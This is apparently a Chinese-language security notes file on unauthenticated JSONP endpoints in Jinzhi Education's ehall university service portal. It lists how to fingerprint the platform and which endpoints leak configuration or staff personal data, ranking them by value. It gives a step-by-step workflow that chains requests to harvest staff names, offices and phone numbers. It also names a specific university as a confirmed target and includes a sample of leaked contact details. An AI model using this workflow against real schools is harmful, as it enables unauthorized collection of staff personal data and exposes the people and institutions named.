# 金智教育 ehall 未授权API参考

## 概述
金智教育(JinZhiJiaoYu)是国内高校办事大厅(ehall)的主流供应商。部分学校的ehall JSONP接口无需认证即可访问，可泄露服务配置和教职工个人信息。

## 识别方式
- URL: `https://ehall.xxx.edu.cn/`
- 302重定向到 `authserver.xxx.edu.cn/authserver/login`
- 页面含: `金智教育`, `AMPConfigure`, `sudy-wp`
- openresty/nginx反代

## 公开API端点 (逐校测试，部分可能404/302)

### 高价值 - 泄露PII
```
GET /jsonp/appIntroduction.json?appId={appId}
```
返回应用详情，`introduction`字段含教职工姓名、办公室、电话:
```json
{
  "appInfo": {"appName":"xxx", "vendorName":"金智教育", "version":"1.0_R1"},
  "introduction": "...叶老师，南昌广兰校区图书馆C0303室，0791-83890898..."
}
```
appId从serviceCenterData.json获取。

### 中价值 - 泄露配置
```
GET /jsonp/serviceCenterData.json?searchKey=&containLabels=true
```
返回所有可见应用的ID/名称/分类/版本/key。

```
GET /jsonp/school.json
```
返回schoolId、authserver地址、角色配置、联系电话。

```
GET /jsonp/userInfo.json
```
返回站点结构、菜单配置、siteId。

### 低价值 - 空数据但可访问
- `/jsonp/userSearchHistory.json`
- `/jsonp/userFavoriteApps.json`
- `/jsonp/myAppService.json`
- `/jsonp/readyAndOpenService.json`
- `/jsonp/getThemeData.json`

## 提取appId流程
1. 访问 `/jsonp/serviceCenterData.json?searchKey=&containLabels=true`
2. 从返回JSON的 `searchResult` 数组中提取 `appId` 字段
3. 用appId访问 `/jsonp/appIntroduction.json?appId={id}`
4. 检查introduction字段是否含PII(老师/电话/办公室)

## 已验证学校
- 东华理工大学 ecut.edu.cn: appIntroduction泄露教职工信息(中危)
- 湖北水利水电职业技术学院 hbsy.cn: API返回302/404(配置不同)

## 注意事项
- 不同学校配置不同，需逐个测试
- 部分学校ehall使用SPA架构，所有路径返回同一页面
- 部分学校有WAF(宝塔/NNUTC CLOUD)拦截
- appIntroduction的PII内容由学校管理员填写，非所有应用都有
